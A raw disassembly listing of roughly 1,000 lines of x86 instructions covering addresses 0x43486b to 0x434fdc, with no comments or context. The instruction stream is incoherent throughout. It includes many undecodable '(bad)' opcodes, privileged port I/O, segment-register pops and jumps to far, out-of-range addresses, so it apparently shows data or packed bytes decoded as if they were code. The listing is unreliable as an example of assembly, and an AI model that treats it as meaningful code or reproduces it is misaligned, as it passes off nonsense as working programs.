  43486b:	aas    
  43486c:	push   ebp
  43486d:	in     al,0x13
  43486f:	mov    BYTE PTR [edx+0x4f],bl
  434872:	add    BYTE PTR [ebx],cl
  434874:	adc    edi,edi
  434876:	or     dh,ah
  434878:	or     DWORD PTR [ecx],edi
  43487a:	push   eax
  43487b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43487c:	rcl    BYTE PTR [ebx],0x4d
  43487f:	add    BYTE PTR [eax],al
  434881:	add    BYTE PTR [eax],al
  434883:	add    BYTE PTR [edi-0x7810154e],bl
  434889:	repnz cmc 
  43488b:	cmp    bh,cl
  43488d:	scas   al,BYTE PTR es:[edi]
  43488e:	dec    ecx
  43488f:	add    eax,0x7ee5e70d
  434894:	push   edi
  434895:	mov    esi,0x3654ebdd
  43489a:	lods   al,BYTE PTR ds:[esi]
  43489b:	cmc    
  43489c:	pop    ss
  43489d:	mov    ebp,0x8c2ba188
  4348a3:	in     al,dx
  4348a4:	fistp  QWORD PTR [edx+0x380df5b4]
  4348aa:	jb     0x43489a
  4348ac:	ret    
  4348ad:	add    al,0x6e
  4348af:	daa    
  4348b0:	mov    bl,al
  4348b2:	xor    DWORD PTR [eax+ebp*1],eax
  4348b5:	mov    ecx,0x2b39f58f
  4348ba:	stos   BYTE PTR es:[edi],al
  4348bb:	xor    edi,DWORD PTR [ebp+0x1358f5ee]
  4348c1:	aaa    
  4348c2:	loope  0x4348df
  4348c4:	sbb    DWORD PTR [edi+0x7283f4f9],edi
  4348ca:	out    0x43,al
  4348cc:	nop
  4348cd:	sub    ecx,DWORD PTR [ecx+ecx*4]
  4348d0:	(bad)  [ecx-0x58]
  4348d3:	jnp    0x4348ce
  4348d5:	ss pusha 
  4348d7:	not    BYTE PTR [ebx]
  4348d9:	inc    eax
  4348da:	mov    ds:0x6ed849eb,al
  4348df:	daa    
  4348e0:	mov    al,ds:0x1703b1c3
  4348e5:	test   DWORD PTR [ebp+0x70],esi
  4348eb:	add    BYTE PTR [eax],al
  4348ed:	dec    esp
  4348ee:	mov    dl,0xaa
  4348f0:	mov    ds:0x3b9c354,al
  4348f5:	inc    edi
  4348f6:	outs   dx,BYTE PTR ds:[esi]
  4348f7:	and    eax,0x38b29002
  4348fc:	and    DWORD PTR [ebp+eax*4-0x21387778],0x8e40600e
  434907:	cs pusha 
  434909:	cmp    BYTE PTR [esi+0x389d1a32],cl
  43490f:	add    DWORD PTR [ecx],eax
  434911:	mov    eax,ds:0x87100ef2
  434916:	jbe    0x434977
  434918:	and    eax,0x8118be94
  43491d:	pop    esi
  43491e:	mov    ds:0xee7ae90e,eax
  434923:	adc    cl,ch
  434925:	xchg   ebx,eax
  434926:	adc    eax,0xb2d03a52
  43492b:	xchg   ecx,eax
  43492c:	test   eax,0xeb2a318c
  434931:	xchg   ebx,eax
  434932:	mov    dl,0x91
  434934:	mov    dl,0xb6
  434936:	stos   BYTE PTR es:[edi],al
  434937:	js     0x434920
  434939:	fisttp DWORD PTR [ebp+0x1e]
  43493c:	jmp    0x4348d1
  43493e:	mov    dl,0x97
  434940:	repnz fsubrp st(0),st
  434943:	xchg   ecx,eax
  434944:	mov    al,ds:0xe778a8b6
  434949:	les    ebp,FWORD PTR ds:0xeea0ad29
  43494f:	push   cs
  434950:	push   eax
  434951:	add    BYTE PTR [eax],al
  434953:	add    BYTE PTR [eax],al
  434955:	add    bl,dh
  434957:	xor    eax,0x4418e9eb
  43495c:	xchg   edi,eax
  43495d:	cs jmp 0x434950
  434960:	jmp    0xbc05:0x5a2ffc46
  434967:	das    
  434968:	mul    BYTE PTR [eax+0x6f]
  43496b:	mov    cs,WORD PTR [edx]
  43496d:	inc    ecx
  43496e:	lods   al,BYTE PTR ds:[esi]
  43496f:	ss jmp 0x434998
  434972:	or     ch,bh
  434974:	xor    ah,cl
  434976:	mov    BYTE PTR [ecx+0x61],dh
  434979:	clc    
  43497a:	mov    bl,BYTE PTR [ecx-0x4d8065aa]
  434980:	sbb    eax,DWORD PTR [eax]
  434982:	and    al,0x1
  434984:	jmp    0x434985
  434986:	mov    ecx,0xb9019548
  43498b:	mov    cl,0x74
  43498d:	sbb    BYTE PTR [esi],al
  43498f:	aas    
  434990:	pop    ds
  434991:	sub    BYTE PTR [edx],ch
  434993:	jmp    0x401c:0xc984ff0e
  43499a:	jns    0x434950
  43499c:	(bad)  
  43499d:	mov    DWORD PTR [ebp+0x3285228a],ebp
  4349a3:	mov    ebx,0xe0616a16
  4349a8:	rep outs dx,BYTE PTR ds:[esi]
  4349aa:	js     0x43495d
  4349ac:	push   cs
  4349ad:	mov    edi,esp
  4349af:	push   ebp
  4349b0:	(bad)  
  4349b1:	stc    
  4349b2:	cs inc ecx
  4349b4:	xchg   ebx,eax
  4349b5:	inc    esp
  4349b6:	push   ebp
  4349b7:	popf   
  4349b8:	pop    eax
  4349ba:	add    BYTE PTR [eax],al
  4349bc:	add    BYTE PTR [eax],al
  4349be:	add    BYTE PTR [esi+esi*1+0x576e0871],ah
  4349c5:	pop    ecx
  4349c6:	add    DWORD PTR [ecx],ebp
  4349c8:	mov    cl,0x91
  4349ca:	sar    BYTE PTR [edx-0x7a76f792],1
  4349d0:	mov    bh,dh
  4349d2:	mov    BYTE PTR [ebp-0x76],dh
  4349d5:	ss mov ecx,esp
  4349d8:	push   ebp
  4349d9:	adc    cl,BYTE PTR [ebx-0x730172bb]
  4349df:	xor    eax,0x38502e8d
  4349e4:	ficom  DWORD PTR [ecx-0x6cc47d36]
  4349ea:	jl     0x434981
  4349ec:	xchg   edx,eax
  4349ed:	test   BYTE PTR [edi],0xfa
  4349f0:	mov    al,0xe
  4349f2:	mov    esi,DWORD PTR [ecx-0x36dbad4b]
  4349f8:	xchg   ebx,eax
  4349f9:	rol    BYTE PTR [ebx],1
  4349fb:	js     0x4349ac
  4349fd:	push   edx
  4349fe:	and    al,0x90
  434a00:	cmp    ebp,DWORD PTR [edx+0x4c]
  434a03:	je     0x434a74
  434a05:	or     al,0xc5
  434a07:	or     edi,edi
  434a09:	xor    bl,BYTE PTR [eax]
  434a0b:	sbb    eax,DWORD PTR [ebp+0x3ba8ddca]
  434a11:	loopne 0x434998
  434a13:	dec    esp
  434a14:	outs   dx,DWORD PTR ds:[esi]
  434a15:	pop    ss
  434a16:	adc    eax,0xffffffd5
  434a19:	jmp    0x36f146a2
  434a1e:	jge    0x4349a9
  434a20:	inc    edi
  434a21:	popa   
  434a22:	mov    eax,0x0
  434a27:	add    BYTE PTR [ebx],cl
  434a29:	xchg   BYTE PTR [esi],dh
  434a2b:	xor    al,0x13
  434a2d:	jae    0x434a45
  434a2f:	ins    DWORD PTR es:[edi],dx
  434a30:	lods   al,BYTE PTR ds:[esi]
  434a31:	rol    BYTE PTR [ebx+0x24],0xac
  434a35:	leave  
  434a36:	cmp    DWORD PTR [eax+0x448d7de5],edx
  434a3c:	lods   al,BYTE PTR ds:[esi]
  434a3d:	gs aas 
  434a3f:	dec    edi
  434a40:	sbb    eax,DWORD PTR [esi-0x2f1de7ca]
  434a46:	loope  0x4349cf
  434a48:	mov    esp,0xe7e81f6d
  434a4d:	inc    edi
  434a4e:	ltr    WORD PTR [ebx]
  434a51:	sbb    ch,BYTE PTR [esp+eax*2+0x6c]
  434a55:	gs or  al,0xc2
  434a58:	or     edx,DWORD PTR [eax]
  434a5a:	or     al,0x4c
  434a5c:	ins    BYTE PTR es:[edi],dx
  434a5d:	lods   eax,DWORD PTR ds:[esi]
  434a5e:	adc    edi,DWORD PTR [esi+0x10330d91]
  434a64:	sbb    DWORD PTR [esi],ecx
  434a66:	xor    ebx,DWORD PTR [eax]
  434a68:	adc    esp,ebx
  434a6a:	push   ss
  434a6b:	outs   dx,BYTE PTR ds:[esi]
  434a6c:	enter  0x43c0,0x24
  434a70:	mov    eax,0x802446b2
  434a75:	repz adc esp,ecx
  434a78:	or     ecx,DWORD PTR [esi]
  434a7a:	xor    edx,DWORD PTR [ebx+ecx*1]
  434a7d:	mov    bl,0xa1
  434a7f:	daa    
  434a80:	mov    al,ds:0xa4278127
  434a85:	mov    BYTE PTR ds:0x8927967b,ch
  434a8b:	daa    
  434a8c:	add    BYTE PTR [eax],al
  434a8e:	add    BYTE PTR [eax],al
  434a90:	add    BYTE PTR [eax+0x623b5de1],bl
  434a96:	das    
  434a97:	xor    eax,0xe4e24223
  434a9c:	pop    ss
  434a9d:	cmp    al,0x9c
  434a9f:	mov    ch,0x3
  434aa1:	or     eax,0xd2819c7
  434aa6:	outs   dx,DWORD PTR ds:[esi]
  434aa7:	stc    
  434aa8:	test   BYTE PTR [ebx-0x9edb467],cl
  434aae:	lods   al,BYTE PTR ds:[esi]
  434aaf:	into   
  434ab0:	or     eax,0x85d43379
  434ab5:	lods   eax,DWORD PTR ds:[si]
  434ab7:	sub    BYTE PTR [esi+0x752d75e5],ch
  434abd:	aam    0xb2
  434abf:	cmc    
  434ac0:	jl     0x434a9e
  434ac2:	mov    gs,ecx
  434ac4:	pop    ebp
  434ac5:	xchg   edi,eax
  434ac6:	rol    DWORD PTR [edx],cl
  434ac8:	pop    ebx
  434ac9:	sub    eax,0x744870d1
  434ace:	sahf   
  434acf:	jo     0x434b11
  434ad1:	ins    BYTE PTR es:[edi],dx
  434ad2:	jp     0x434b32
  434ad4:	cmp    al,0x6c
  434ad6:	mov    ds:0xaf8a3c23,eax
  434adb:	lods   eax,DWORD PTR ds:[esi]
  434adc:	jg     0x434a62
  434ade:	test   BYTE PTR [esi+0x54],ch
  434ae1:	pop    eax
  434ae2:	and    eax,0x62b506b6
  434ae7:	pusha  
  434ae8:	dec    eax
  434ae9:	lods   al,BYTE PTR ds:[esi]
  434aea:	mov    bh,BYTE PTR [ebx]
  434aec:	add    esi,edi
  434aee:	sub    BYTE PTR [esi-0x58e8afe],ah
  434af4:	sub    al,0x0
  434af6:	add    BYTE PTR [eax],al
  434af8:	add    BYTE PTR [eax],al
  434afa:	fdivr  DWORD PTR [esi-0x1dd8e33a]
  434b00:	push   cs
  434b01:	rcr    DWORD PTR [edi],0xb2
  434b04:	push   cs
  434b05:	jmp    0xeb46954c
  434b0a:	xchg   edx,eax
  434b0b:	mov    dl,0x8f
  434b0d:	and    eax,0xcd522790
  434b12:	and    edx,0x78
  434b15:	test   eax,0x8595e05e
  434b1a:	ja     0x434b0e
  434b1c:	jmp    0x434af2
  434b1e:	stos   DWORD PTR es:[edi],eax
  434b1f:	mov    ds:0x7216e94e,eax
  434b24:	popa   
  434b25:	mov    bh,0xa0
  434b27:	sahf   
  434b28:	jle    0x434b25
  434b2a:	shl    DWORD PTR [edx-0x58fb1e69],cl
  434b30:	xor    bh,ch
  434b32:	cli    
  434b33:	in     eax,dx
  434b34:	push   edx
  434b35:	pop    edx
  434b36:	enter  0x91b2,0xbf
  434b3a:	out    0xb3,eax
  434b3c:	xchg   edi,eax
  434b3d:	scas   eax,DWORD PTR es:[edi]
  434b3e:	dec    ebx
  434b3f:	mov    ebp,eax
  434b41:	mov    dh,0x60
  434b43:	ss (bad) 
  434b45:	xor    eax,0x91d73789
  434b4a:	inc    ecx
  434b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434b4c:	jmp    0x434aec
  434b4e:	les    ecx,FWORD PTR [esi-0x32453ace]
  434b54:	jb     0x434b53
  434b56:	iret   
  434b57:	mov    dl,0x97
  434b59:	scas   al,BYTE PTR es:[edi]
  434b5a:	dec    esp
  434b5b:	fst    QWORD PTR [edi+0x25]
  434b61:	add    BYTE PTR [eax],al
  434b63:	js     0x434b43
  434b65:	xchg   edi,eax
  434b66:	std    
  434b67:	ja     0x434b2f
  434b69:	xchg   ebp,eax
  434b6a:	sub    dl,BYTE PTR [edi+esi*1]
  434b6d:	push   edx
  434b6e:	or     eax,0xed4f39a0
  434b73:	mov    ah,BYTE PTR [edi-0x3d7b9fee]
  434b79:	xchg   edi,eax
  434b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434b7b:	scas   eax,DWORD PTR es:[edi]
  434b7c:	loop   0x434b13
  434b7e:	add    BYTE PTR [edx],bh
  434b80:	retf   0x388b
  434b83:	sub    bh,BYTE PTR [edx+0xe]
  434b86:	mov    edx,ebp
  434b88:	lods   al,BYTE PTR ds:[esi]
  434b89:	pop    es
  434b8a:	cmp    BYTE PTR [edx],bl
  434b8c:	jp     0x434b9c
  434b8e:	xor    edi,DWORD PTR [ecx-0x7d]
  434b91:	inc    edi
  434b92:	pop    edi
  434b93:	shl    BYTE PTR [esi],cl
  434b95:	shr    BYTE PTR [ebx+ebp*2],cl
  434b98:	xor    ebx,ebp
  434b9a:	push   ebp
  434b9b:	xor    ah,BYTE PTR [ecx*8+0x4e58b906]
  434ba2:	add    BYTE PTR [ecx-0x59005706],al
  434ba8:	sub    dl,BYTE PTR [edx+0x24]
  434bab:	mov    cl,0xb4
  434bad:	bound  eax,QWORD PTR [edi]
  434baf:	add    dh,BYTE PTR [ecx-0xa]
  434bb2:	pushf  
  434bb3:	fsub   QWORD PTR [ecx]
  434bb5:	in     eax,0x8b
  434bb7:	das    
  434bb8:	sub    BYTE PTR [esp+eax*1-0x136e7597],0xfa
  434bc0:	sbb    ah,dh
  434bc2:	adc    DWORD PTR [ebp+0x7a],0x59
  434bc6:	push   esi
  434bc7:	add    BYTE PTR [eax],al
  434bc9:	add    BYTE PTR [eax],al
  434bcb:	add    dl,dh
  434bcd:	daa    
  434bce:	cmp    ecx,ecx
  434bd0:	repz (bad) 
  434bd2:	cmp    al,0x8b
  434bd4:	lock scas al,BYTE PTR es:[edi]
  434bd6:	bound  esp,QWORD PTR [eax*2+0x41246aae]
  434bdd:	scas   al,BYTE PTR es:[edi]
  434bde:	dec    edx
  434bdf:	and    al,0x55
  434be1:	ficomp WORD PTR [eax+0xc]
  434be4:	das    
  434be5:	jns    0x434b78
  434be7:	shl    DWORD PTR [eax-0x4defcd8e],0x80
  434bee:	push   ss
  434bef:	add    eax,DWORD PTR [ecx]
  434bf1:	fist   WORD PTR [ecx]
  434bf3:	jne    0x434b8e
  434bf5:	xchg   DWORD PTR [ebx+0x51],ebx
  434bf8:	dec    eax
  434bf9:	xchg   BYTE PTR [ebx+0x33],bl
  434bfc:	nop
  434bfd:	in     eax,dx
  434bfe:	pop    ds
  434bff:	(bad)  
  434c00:	call   0xf03ce124
  434c05:	mov    eax,ds:0x967c2456
  434c0a:	shl    BYTE PTR [ebx-0x57],cl
  434c0d:	xchg   esp,eax
  434c0e:	push   esi
  434c0f:	and    al,0x80
  434c11:	sub    al,0xaa
  434c13:	mov    BYTE PTR [ebx-0x1],bl
  434c16:	addr16 pop esp
  434c18:	ins    BYTE PTR es:[edi],dx
  434c19:	pop    ds
  434c1a:	push   esp
  434c1b:	jge    0x434bed
  434c1d:	repnz imul edi,DWORD PTR [esp+ebp*2+0x23],0xb74446a
  434c26:	cmp    BYTE PTR [edx-0x6c],bh
  434c29:	lods   eax,DWORD PTR ds:[esi]
  434c2a:	int    0x59
  434c2c:	ds xchg ebp,eax
  434c2e:	iret   
  434c2f:	push   ebp
  434c30:	add    BYTE PTR [eax],al
  434c32:	add    BYTE PTR [eax],al
  434c34:	add    BYTE PTR [ebx],cl
  434c36:	mov    dh,0x3d
  434c38:	mov    esi,0x1451994
  434c3d:	adc    eax,0xd57168d
  434c42:	xchg   BYTE PTR [esi],dh
  434c44:	xor    al,0x83
  434c46:	aaa    
  434c47:	in     al,dx
  434c48:	mov    al,0xdb
  434c4a:	mov    ecx,0xe6598374
  434c4f:	and    BYTE PTR [ecx],cl
  434c51:	daa    
  434c52:	fnsave [eax]
  434c54:	bound  ecx,QWORD PTR ds:0x1b27635a
  434c5a:	push   0xffffffc7
  434c5c:	jb     0x434be8
  434c5e:	push   eax
  434c5f:	cld    
  434c60:	bound  ecx,QWORD PTR [ebx]
  434c62:	out    dx,al
  434c63:	ss xor al,0x87
  434c66:	mov    bh,cl
  434c68:	bound  edx,QWORD PTR [ecx+0x5a]
  434c6b:	out    0x8,eax
  434c6d:	fbld   TBYTE PTR [ecx-0x14]
  434c70:	mov    al,0x52
  434c72:	shr    BYTE PTR [edx],cl
  434c74:	je     0x434c03
  434c76:	pushf  
  434c77:	(bad)  
  434c78:	adc    eax,DWORD PTR [ebp+0xf65e1b2]
  434c7e:	jg     0x434c91
  434c80:	ss cmc 
  434c82:	mov    ch,0xdb
  434c84:	jp     0x434ce2
  434c86:	(bad)  
  434c87:	add    edi,edi
  434c89:	and    ch,bh
  434c8b:	mov    esi,0x91cff801
  434c90:	out    dx,al
  434c91:	fnstcw WORD PTR [edi+0x3d40c36b]
  434c97:	mov    DWORD PTR [edi],esp
  434c99:	add    BYTE PTR [eax],al
  434c9b:	add    BYTE PTR [eax],al
  434c9d:	add    BYTE PTR [eax+0x1a],bh
  434ca0:	sbb    al,0xa3
  434ca2:	leave  
  434ca3:	das    
  434ca4:	jp     0x434ce5
  434ca6:	je     0x434c7a
  434ca8:	(bad)  
  434ca9:	out    dx,al
  434caa:	mov    ecx,0x90599c2f
  434caf:	sbb    bl,ch
  434cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434cb2:	test   eax,0x7477602f
  434cb7:	(bad)  
  434cb8:	jns    0x434c7d
  434cba:	sbb    al,0xd3
  434cbc:	cld    
  434cbd:	ja     0x434c57
  434cbf:	mov    edi,0x819c468c
  434cc4:	and    eax,0x72c302ed
  434cc9:	dec    eax
  434cca:	lods   al,BYTE PTR ds:[esi]
  434ccb:	jbe    0x434cf2
  434ccd:	jg     0x434cab
  434ccf:	(bad)  
  434cd0:	jmp    0xac9db0b0
  434cd5:	in     eax,dx
  434cd6:	adc    al,0xf2
  434cd8:	sub    BYTE PTR [edi],al
  434cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434cdb:	repnz xor al,0xd9
  434cde:	dec    esi
  434cdf:	in     al,0xb5
  434ce1:	jl     0x434c68
  434ce3:	(bad)  
  434ce4:	pusha  
  434ce5:	push   eax
  434ce6:	je     0x434ca6
  434ce8:	jns    0x434cae
  434cea:	scas   al,BYTE PTR es:[edi]
  434ceb:	mov    cl,0xcc
  434ced:	mov    ch,0x45
  434cef:	mov    ah,ah
  434cf1:	inc    esi
  434cf2:	dec    eax
  434cf3:	cmp    edi,DWORD PTR [ebx+0xed6bc7b]
  434cf9:	in     eax,0x3b
  434cfb:	mov    dh,0xe0
  434cfd:	outs   dx,DWORD PTR ds:[esi]
  434cfe:	std    
  434cff:	cmp    bl,BYTE PTR [edx+0xd]
  434d02:	add    BYTE PTR [eax],al
  434d04:	add    BYTE PTR [eax],al
  434d06:	add    BYTE PTR [ecx+esi*8-0x594bfaaf],ch
  434d0d:	scas   eax,DWORD PTR es:[edi]
  434d0e:	test   eax,0x8b851a93
  434d13:	std    
  434d14:	sub    BYTE PTR [edi-0x68315043],dl
  434d1a:	mov    ebp,0xad97cab7
  434d1f:	scas   eax,DWORD PTR es:[edi]
  434d20:	ret    0x201f
  434d23:	jmp    0x434d51
  434d25:	in     al,dx
  434d26:	es mov ch,0x82
  434d29:	xchg   edi,eax
  434d2a:	or     eax,0xbf4a1e11
  434d2f:	and    BYTE PTR [eiz*1+0x513b8394],0x45
  434d37:	sub    esi,DWORD PTR [ebx-0x62]
  434d3a:	ins    BYTE PTR es:[edi],dx
  434d3b:	push   edi
  434d3c:	push   0x1b
  434d3e:	lods   al,BYTE PTR ds:[esi]
  434d3f:	dec    esi
  434d40:	ret    0x2091
  434d43:	jb     0xfe124417
  434d49:	xchg   esi,eax
  434d4a:	sub    al,0x7c
  434d4c:	xor    eax,0xa1fa8d61
  434d51:	mov    dh,0x60
  434d53:	out    0x5e,al
  434d55:	xchg   ebp,eax
  434d56:	sub    al,0x28
  434d58:	ss popa 
  434d5a:	jge    0x434d36
  434d5c:	loop   0x434cef
  434d5e:	mov    al,ds:0xdc78b4de
  434d63:	cmp    al,0xc2
  434d65:	mov    bh,bl
  434d67:	shl    DWORD PTR [edx+0xf4f7],cl
  434d6d:	add    BYTE PTR [eax],al
  434d6f:	add    BYTE PTR [esp+eiz*2],bh
  434d72:	or     eax,0xd1b6b738
  434d77:	mov    DWORD PTR [edx-0x74fff18e],edi
  434d7d:	xchg   BYTE PTR [edi+0x3e1ed54d],dl
  434d83:	add    al,0xb2
  434d85:	and    DWORD PTR [ecx-0x5396603a],edx
  434d8b:	or     al,0xf9
  434d8d:	sbb    BYTE PTR [ebx-0x75],0x45
  434d91:	(bad)  
  434d92:	sbb    dl,BYTE PTR [ebx+0x72]
  434d95:	ret    
  434d96:	aas    
  434d97:	push   esi
  434d98:	es stos DWORD PTR es:[edi],eax
  434d9a:	ret    
  434d9b:	mov    ebp,DWORD PTR [ebx-0x16ff53da]
  434da1:	mov    cl,0x2e
  434da3:	je     0x434d97
  434da5:	xor    ah,BYTE PTR [ecx+0x4]
  434da8:	mov    ecx,0x9fc114a5
  434dad:	sub    eax,0xda2a08f2
  434db2:	push   cs
  434db3:	jmp    0x434d4a
  434db5:	lock test DWORD PTR [eax],0xe6696b32
  434dbc:	sahf   
  434dbd:	lock retf 0x6808
  434dc1:	sbb    BYTE PTR [edx],cl
  434dc3:	mov    ecx,DWORD PTR [edi+0x5210f3f0]
  434dc9:	or     BYTE PTR [ecx+0x32eb00fe],dl
  434dcf:	adc    al,0xea
  434dd1:	adc    al,0x15
  434dd3:	jbe    0x434dd5
  434dd5:	add    BYTE PTR [eax],al
  434dd7:	add    BYTE PTR [eax],al
  434dd9:	mov    cl,0xad
  434ddb:	push   edx
  434ddc:	and    al,0x95
  434dde:	lods   al,BYTE PTR ds:[esi]
  434ddf:	adc    al,BYTE PTR [edx]
  434de1:	loope  0x434e55
  434de3:	xor    dl,BYTE PTR [ebx]
  434de5:	outs   dx,BYTE PTR ds:[esi]
  434de6:	arpl   si,cx
  434de8:	mov    ch,cl
  434dea:	push   ss
  434deb:	inc    ax
  434ded:	cmp    DWORD PTR [eax],ebp
  434def:	popf   
  434df0:	clc    
  434df1:	mov    edx,0x1f031511
  434df6:	dec    esi
  434df7:	(bad)  
  434df8:	jae    0x434d8a
  434dfa:	repz imul eax,DWORD PTR [esp+esi*2-0x9],0x68
  434e00:	inc    esp
  434e01:	xchg   edx,eax
  434e02:	sbb    cl,BYTE PTR [ebx]
  434e04:	add    DWORD PTR [esi+edx*1+0x5e],ebx
  434e08:	adc    cl,BYTE PTR [edx]
  434e0a:	fild   QWORD PTR [esi]
  434e0c:	or     eax,0x55e5bb4
  434e11:	les    ebx,FWORD PTR [ebx+0x5e]
  434e14:	std    
  434e15:	push   esi
  434e16:	or     BYTE PTR [edi],0x3c
  434e19:	adc    BYTE PTR [esi],cl
  434e1b:	adc    al,0x7d
  434e1d:	xlat   BYTE PTR ds:[ebx]
  434e1e:	push   ss
  434e1f:	ins    BYTE PTR es:[edi],dx
  434e20:	jmp    0xf982d0e0
  434e25:	fs mov bh,0xa
  434e28:	stc    
  434e29:	pop    esp
  434e2a:	mov    edi,0x3fa5f90a
  434e2f:	std    
  434e30:	aas    
  434e31:	nop
  434e32:	mov    al,ds:0x9870244e
  434e37:	into   
  434e38:	or     al,0xd
  434e3a:	fistp  DWORD PTR [esi+0x16]
  434e3d:	add    BYTE PTR [eax],al
  434e3f:	add    BYTE PTR [eax],al
  434e41:	add    BYTE PTR [ebp-0x70],al
  434e44:	inc    esi
  434e45:	and    al,0x78
  434e47:	dec    ebx
  434e48:	cmp    eax,0xba69f53
  434e4d:	xor    BYTE PTR [ebx],cl
  434e4f:	ror    dl,1
  434e51:	(bad)  
  434e52:	nop
  434e53:	sbb    DWORD PTR [edi],ecx
  434e55:	test   ebx,ebx
  434e57:	and    eax,0x166aff6a
  434e5c:	ins    BYTE PTR es:[edi],dx
  434e5d:	ins    BYTE PTR es:[edi],dx
  434e5e:	lods   al,BYTE PTR ds:[esi]
  434e5f:	mov    ebp,0x1db44c6b
  434e64:	loopne 0x434e65
  434e66:	sbb    cl,BYTE PTR [bx]
  434e69:	inc    eax
  434e6a:	in     al,0x16
  434e6c:	ins    BYTE PTR es:[edi],dx
  434e6d:	cmp    eax,0xf1176c80
  434e72:	xchg   ecx,eax
  434e73:	sbb    DWORD PTR [edi],ecx
  434e75:	add    BYTE PTR [eax+0x150209b2],ah
  434e7b:	jo     0x434e76
  434e7d:	xchg   BYTE PTR [eax+0x78ff722b],cl
  434e83:	mov    edi,DWORD PTR [ebx]
  434e85:	dec    ecx
  434e86:	mov    ebp,0x8cc62e89
  434e8b:	mov    dl,0x8
  434e8d:	push   edx
  434e8e:	or     eax,0x610fd9a7
  434e93:	aaa    
  434e94:	stc    
  434e95:	pop    ds
  434e96:	pushf  
  434e97:	test   BYTE PTR [edx+ebp*8+0x7f0dd684],ch
  434e9e:	fistp  WORD PTR [edx]
  434ea0:	dec    edx
  434ea1:	jmp    0x518d7a8f
  434ea6:	add    BYTE PTR [eax],al
  434ea8:	add    BYTE PTR [eax],al
  434eaa:	add    bh,ah
  434eac:	and    esp,0x2038deb1
  434eb2:	js     0x434e50
  434eb4:	cmc    
  434eb5:	push   esp
  434eb6:	ins    BYTE PTR es:[edi],dx
  434eb7:	push   eax
  434eb8:	mov    dl,0x4a
  434eba:	inc    edx
  434ebb:	(bad)  
  434ebc:	jnp    0x434e69
  434ebe:	jmp    0xf05d:0x49acb662
  434ec5:	lock add ebx,DWORD PTR [ebp-0x7c]
  434ec9:	jo     0x434f3a
  434ecb:	ins    BYTE PTR es:[edi],dx
  434ecc:	(bad)  
  434ecd:	mov    edx,?
  434ecf:	fldcw  WORD PTR [esi+esi*8-0x4ec84082]
  434ed6:	pop    ds
  434ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434ed8:	aaa    
  434ed9:	mov    eax,0xf7841af7
  434ede:	add    al,0x61
  434ee0:	cmp    ebp,esp
  434ee2:	sbb    al,0x7f
  434ee4:	xor    al,BYTE PTR [ebx]
  434ee6:	fucom  st(3)
  434ee8:	les    ecx,FWORD PTR [edx+0x42]
  434eeb:	imul   esi,esp,0xfffffff5
  434eee:	ficomp DWORD PTR [ebp-0xc]
  434ef1:	pop    ebp
  434ef2:	inc    ebx
  434ef3:	push   edi
  434ef4:	cmp    BYTE PTR [esi],cl
  434ef6:	sub    ah,BYTE PTR [ecx+esi*8-0x4d6c15f3]
  434efd:	push   cs
  434efe:	xchg   edx,eax
  434eff:	xchg   edi,eax
  434f00:	lock or al,0xee
  434f03:	mov    ch,0xb0
  434f05:	xor    ah,dh
  434f07:	daa    
  434f08:	stos   DWORD PTR es:[edi],eax
  434f09:	xchg   esi,eax
  434f0a:	sub    BYTE PTR [ebx+0x855437],dl
  434f10:	add    BYTE PTR [eax],al
  434f12:	add    BYTE PTR [eax],al
  434f14:	xchg   ebp,eax
  434f15:	icebp  
  434f16:	xchg   esp,eax
  434f17:	sub    BYTE PTR [esi-0x2f26b0cb],cl
  434f1d:	mov    cl,0x12
  434f1f:	jmp    0x748f01b7
  434f24:	push   edx
  434f25:	sub    al,0x49
  434f27:	ret    0xbdcd
  434f2a:	push   cs
  434f2b:	mov    edx,0x62c5355e
  434f30:	test   al,0xd6
  434f32:	or     bl,BYTE PTR [edi-0x26cd59a4]
  434f38:	push   esp
  434f39:	imul   ebx,DWORD PTR [edi],0x1b
  434f3c:	popa   
  434f3d:	xor    eax,0x7a6c056a
  434f42:	(bad)  
  434f43:	(bad)  
  434f44:	jnp    0x434eec
  434f46:	sbb    al,0xb1
  434f48:	jnp    0x434ef0
  434f4a:	adc    DWORD PTR [edx-0x34],ebp
  434f4d:	mov    ch,0x61
  434f4f:	fisub  WORD PTR [esi+eax*8]
  434f52:	sub    al,0x12
  434f54:	sahf   
  434f55:	mov    ecx,0x1569d5ab
  434f5a:	adc    ah,dh
  434f5c:	cmp    DWORD PTR [edi-0x312f9dd4],edi
  434f62:	push   es
  434f63:	je     0x434f0c
  434f65:	sub    BYTE PTR [eax],dl
  434f67:	dec    ebp
  434f68:	mov    al,0xc6
  434f6a:	aaa    
  434f6b:	mov    edi,0x55550294
  434f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434f71:	jno    0x434fd5
  434f73:	add    BYTE PTR [eax+0x7453ed],al
  434f79:	add    BYTE PTR [eax],al
  434f7b:	add    BYTE PTR [eax],al
  434f7d:	arpl   WORD PTR [edi],bp
  434f7f:	repz add al,0x8c
  434f82:	jns    0x434f17
  434f84:	adc    al,0x37
  434f86:	pop    es
  434f87:	mov    DWORD PTR ds:0x29fa6bdc,edi
  434f8e:	mov    dh,0xe
  434f90:	add    BYTE PTR [ebp+0x16fa6c26],0x1b
  434f97:	in     eax,0x7f
  434f99:	xchg   edi,eax
  434f9a:	rcl    DWORD PTR [ecx+0x2e2f3943],1
  434fa0:	add    BYTE PTR [edx],dl
  434fa2:	fnstenv [eax-0x77]
  434fa5:	fstp   st(3)
  434fa7:	imul   edi,edx,0xffffffe9
  434faa:	xor    eax,0x2dd5ffe5
  434faf:	ins    BYTE PTR es:[edi],dx
  434fb0:	cli    
  434fb1:	inc    esi
  434fb2:	call   0x4391:0xd4d7000e
  434fb9:	mov    ecx,0xe9020df2
  434fbe:	mov    ch,0xe
  434fc0:	jmp    0x434fb1
  434fc2:	lods   eax,DWORD PTR ds:[esi]
  434fc3:	add    bh,BYTE PTR [esi]
  434fc5:	cmp    dl,BYTE PTR [edi]
  434fc7:	mov    ?,WORD PTR [esp+ebp*4+0x2e]
  434fcb:	in     al,0x7f
  434fcd:	pop    ss
  434fce:	sub    eax,0xf2a94b92
  434fd3:	jmp    0xf75f:0xeb5b902
  434fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434fdb:	iret   
  434fdc:	pop    ebp
